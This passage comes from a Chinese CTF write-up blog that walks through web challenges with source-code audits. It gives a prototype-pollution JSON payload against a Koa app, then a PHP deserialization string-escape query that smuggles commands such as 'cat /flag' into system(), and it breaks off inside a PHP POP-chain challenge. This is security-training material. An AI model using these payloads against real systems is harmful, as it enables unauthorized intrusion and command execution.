class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">    <span class="string">&quot;info&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span></span><br><span class="line">].<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> &#123; p = <span class="built_in">require</span>(<span class="string">&quot;./routes/&quot;</span> + p); app.<span class="title function_">use</span>(p.<span class="title function_">routes</span>()).<span class="title function_">use</span>(p.<span class="title function_">allowedMethods</span>()) &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`Server is running at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">分析：</span><br><span class="line">这段代码是一个基于 <span class="title class_">Node</span>.<span class="property">js</span> 和 <span class="title class_">Koa</span> 框架的 web 服务器应用程序。下面是这段代码的详细解释：</span><br><span class="line"></span><br><span class="line">环境变量设置</span><br><span class="line">通过 process.<span class="property">env</span>.<span class="property">NODE_ENV</span> 获取环境变量，如果不存在则默认为 <span class="string">&quot;production&quot;</span>。</span><br><span class="line">判断当前环境是否为开发环境，并设置到全局变量 isEnvDev 中。</span><br><span class="line">devOnly 函数用于只在开发环境中执行特定操作。</span><br><span class="line"></span><br><span class="line">配置加载</span><br><span class="line">加载配置文件 config.<span class="property">js</span> 和默认配置文件 config.<span class="property">default</span>.<span class="property">js</span>。如果 config.<span class="property">js</span> 中没有指定 server_port，则使用 config.<span class="property">default</span>.<span class="property">js</span> 中的 server_port。</span><br><span class="line"></span><br><span class="line">导入模块和初始化应用</span><br><span class="line">导入路径处理模块 path、<span class="title class_">Koa</span> 框架 koa、以及 <span class="title class_">Koa</span> 的 body 解析中间件 koa-bodyparser。</span><br><span class="line">初始化一个新的 <span class="title class_">Koa</span> 应用实例。</span><br><span class="line"></span><br><span class="line">中间件设置</span><br><span class="line">使用 koa-<span class="keyword">static</span> 中间件为静态资源提供服务，静态资源目录为 ./<span class="keyword">static</span>。</span><br><span class="line">在开发环境中，加载并执行 webpack.<span class="property">proxies</span>.<span class="property">dev</span>.<span class="property">js</span> 中定义的所有中间件。</span><br><span class="line">使用 koa-bodyparser 中间件解析请求体。如果请求体是无效的 <span class="title class_">JSON</span>，则将请求体设置为空对象。</span><br><span class="line"></span><br><span class="line">路由加载</span><br><span class="line">加载并执行 ./routes/info.<span class="property">js</span> 和 ./routes/submit.<span class="property">js</span> 中定义的路由。</span><br><span class="line"></span><br><span class="line">启动服务器</span><br><span class="line">监听指定的端口，并在控制台输出服务器运行状态。</span><br><span class="line"></span><br><span class="line">导出应用实例</span><br><span class="line">将 <span class="title class_">Koa</span> 应用实例导出，以便在其他模块中使用。</span><br><span class="line">这个应用程序的主要功能是提供一个 web 服务器，用于处理客户端的请求，并根据请求的 <span class="variable constant_">URL</span> 和方法调用相应的路由处理函数。同时，它还提供了静态资源服务，可以直接访问存放在 ./<span class="keyword">static</span> 目录中的文件。在开发环境中，它还支持通过 webpack.<span class="property">proxies</span>.<span class="property">dev</span>.<span class="property">js</span> 配置的中间件进行额外的处理，例如代理请求到另一个服务器。</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一些变量 </p>
<p>主要是引用了info和submit的路由 并且这两个路由都在routes这个文件夹下</p>
<p>先看info.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SQL</span> = <span class="built_in">require</span>(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sql = <span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config.default&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/info/:ts?&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> ctx.<span class="property">params</span>.<span class="property">ts</span> === <span class="string">&quot;undefined&quot;</span>) ctx.<span class="property">params</span>.<span class="property">ts</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="regexp">/^[0-9]+$/</span>.<span class="title function_">test</span>(ctx.<span class="property">params</span>.<span class="property">ts</span> || <span class="string">&quot;&quot;</span>) ? <span class="title class_">Number</span>(ctx.<span class="property">params</span>.<span class="property">ts</span>) : ctx.<span class="property">params</span>.<span class="property">ts</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> timestamp !== <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter ts&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">getInfo</span>(timestamp).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>主要看getInfo这个函数 它接收了timestamp</p>
<p>这段代码是一个异步函数，它接受一个参数 <code>timestamp</code>，并从数据库中查询特定时间戳之后的所有信息。下面是这段代码的逐行解释：</p>
<ol>
<li><code>async function getInfo(timestamp) &#123;</code>: 定义一个异步函数 <code>getInfo</code>，它接受一个参数 <code>timestamp</code>。</li>
<li><code>timestamp = typeof timestamp === &quot;number&quot; ? timestamp : Date.now();</code>: 如果传入的 <code>timestamp</code> 是数字，则保持不变；否则，使用当前时间戳。</li>
<li><code>// Remove test data from before the movie was released</code>: 这是一个注释，表示要删除电影发布前的测试数据。</li>
<li><strong>let minTimestamp &#x3D; new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();: 从配置中获取最小公开时间（默认为 DEFAULT_CONFIG.min_public_time），并将其转换为时间戳。</strong></li>
<li><strong>timestamp &#x3D; Math.max(timestamp, minTimestamp);: 将传入的 timestamp与最小时间戳进行比较，取两者中的较大值。这样做是为了确保查询的起始时间不会早于配置中指定的最小公开时间。</strong></li>
<li><code>const data = await sql.all(</code>SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;&#x3D; ?<code>, [timestamp]).catch(e =&gt; &#123; throw e &#125;);</code>: 使用 <code>await</code> 关键字等待异步 SQL 查询完成，并捕获可能的错误。这个查询从 <code>wishes</code> 表中选取所有在给定时间戳之后的时间记录。</li>
<li><code>return data;</code>: 返回查询到的数据。</li>
</ol>
<p>根据这段代码 我们可以知道timestamp一定&gt;&#x3D;minTimestamp </p>
<p>所以是怎么定义的呢</p>
<p>let minTimestamp &#x3D; new Date(CONFIG.min_public_time||DEFAULT_CONFIG.min_public_time).getTime(); </p>
<p>是根据CONFIG和DEFAULT_CONFIG来定义的 </p>
<p>所以我们要到CONFIG和DEFAULT_CONFIG中去看这是怎么个事 看看min_public_time是啥</p>
<p>CONFIG:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DEFAULT_CONFIG:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">    <span class="attr">min_public_time</span>: <span class="string">&quot;2019-07-09&quot;</span>,</span><br><span class="line">    <span class="attr">server_port</span>: <span class="number">9960</span>,</span><br><span class="line">    <span class="attr">webpack_dev_port</span>: <span class="number">9970</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源代码：<strong>CONFIG.min_public_time</strong></p>
<p>查看根目录下的<code>config.js</code>和<code>config.default.js</code>后发现<code>config.js</code>并没有配置<code>min_public_time</code>，因此<code>getInfo</code>的第5行只是采用了<code>DEFAULT_CONFIG.min_public_time</code></p>
<p>考虑原型链污染污染<code>min_public_time</code>为我们想要的日期，就能绕过最早时间限制，获取任意时间的数据</p>
<p>所以查看提交函数  在routes这个文件夹下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SQL</span> = <span class="built_in">require</span>(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sql = <span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Base58</span> = <span class="built_in">require</span>(<span class="string">&quot;base-58&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ALPHABET</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rndText</span> = (<span class="params">length</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(&#123; length &#125;, <span class="function">() =&gt;</span> <span class="variable constant_">ALPHABET</span>[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="variable constant_">ALPHABET</span>.<span class="property">length</span>)]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">timeText</span> = (<span class="params">timestamp</span>) =&gt; &#123;</span><br><span class="line">    timestamp = (<span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>()).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">let</span> text1 = timestamp.<span class="title function_">substring</span>(<span class="number">0</span>, timestamp.<span class="property">length</span> / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> text2 = timestamp.<span class="title function_">substring</span>(timestamp.<span class="property">length</span> / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">let</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text1.<span class="property">length</span>; i++)</span><br><span class="line">        text += text1[i] + text2[text2.<span class="property">length</span> - <span class="number">1</span> - i];</span><br><span class="line">    <span class="keyword">if</span> (text2.<span class="property">length</span> &gt; text1.<span class="property">length</span>) text += text2[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Base58</span>.<span class="title function_">encode</span>(<span class="title function_">rndText</span>(<span class="number">3</span>) + <span class="title class_">Buffer</span>.<span class="title function_">from</span>(text)); <span class="comment">// length = 20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rndID</span> = (<span class="params">length, timestamp</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="title function_">timeText</span>(timestamp);</span><br><span class="line">    <span class="keyword">if</span> (length &lt; t.<span class="property">length</span>) <span class="keyword">return</span> t.<span class="title function_">substring</span>(<span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> t + <span class="title function_">rndText</span>(length - t.<span class="property">length</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">insert2db</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="title class_">String</span>(data[<span class="string">&quot;date&quot;</span>]), place = <span class="title class_">String</span>(data[<span class="string">&quot;place&quot;</span>]),</span><br><span class="line">        contact = <span class="title class_">String</span>(data[<span class="string">&quot;contact&quot;</span>]), reason = <span class="title class_">String</span>(data[<span class="string">&quot;reason&quot;</span>]);</span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">const</span> wishid = <span class="title function_">rndID</span>(<span class="number">24</span>, timestamp);</span><br><span class="line">    <span class="keyword">await</span> sql.<span class="title function_">run</span>(<span class="string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>,</span><br><span class="line">        [wishid, date, place, contact, reason, timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/submit&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> jsonText = ctx.<span class="property">request</span>.<span class="property">rawBody</span> || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">DEFAULT</span> = &#123;</span><br><span class="line">            <span class="attr">date</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            <span class="attr">place</span>: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">insert2db</span>(<span class="title function_">merge</span>(<span class="variable constant_">DEFAULT</span>, data));</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>发现merge函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa96c7375.png" alt="image-20240203000237750"></p>
<p><strong>其实找找能够控制数组（对象）的“键名”的操作即可</strong></p>
<p>存在赋值操作dst[key] &#x3D; src[key]</p>
<p>即存在javascript原型链污染</p>
<p>因为默认时间是2019-07-09 所以我们只需要改成比这个小的时间即可绕过限制</p>
<p>注入<code>data[&#39;__proto__&#39;][&#39;min_public_time&#39;]</code>的值即可</p>
<p>提交信息必须为 JSON 格式，<code>contact</code>和<code>reason</code>字段是必须的</p>
<p>payload:</p>
<p>{“date”:”a”,”place”:”b”,”contact”:”c”,”reason”:”d”,”<code>__proto__</code>“: {    “min_public_time”: “1001-01-01”  }}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa993772d.png" alt="image-20240203002355093"></p>
<p>再请求info</p>
<p>最后回显后找到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa999a2cc.png" alt="image-20240203003307901"></p>
<p>海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{546fa7b1-5caa-4d91-b604-217aa0a746ac}です</p>
<p>flag{546fa7b1-5caa-4d91-b604-217aa0a746ac}</p>
<p>终于完了 真的难 其实对这个javascript原型链污染还是有点半懵半懵的 主要是在这些代码是怎么串起来的 为什么向submit的merge传参后就会给到info里,并造成污染 代码审计啊代码审计 思路是清楚了 javascript原型链污染是个怎么个事也是知道了 就是下次做题的时候不一定做的对</p>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h4 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetFlag &#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $cmd = &quot;whoami&quot;;</span><br><span class="line">    public function __construct($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); www-data www-data </span><br></pre></td></tr></table></figure>

<p>反序列化字符串逃逸</p>
<p>bad 替换为 good  字符增加一位</p>
<p>序列化代码构造：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p>O:7:”GetFlag”:2:{s:3:”key”;N;s:3:”cmd”;s:4:”ls &#x2F;“;}</p>
<p>需要逃逸的就是s:3:”cmd”;s:4:”ls &#x2F;“;} 然后为了更好的闭合我一般都会加上”; 这个符号 也就是需要逃逸”;s:3:”cmd”;s:4:”ls &#x2F;“;} 总共24个字符 这样我们只需要写24个bad就行了</p>
<p>?key&#x3D;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad”;s:3:”cmd”;s:4:”ls &#x2F;“;}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa98d52c1.png" alt="image-20240205160515940"></p>
<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa97489fc.png" alt="image-20240205162138681"></p>
<p>flag{6431fc70-1a27-4717-a8a6-8341374a1b06}</p>
<h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 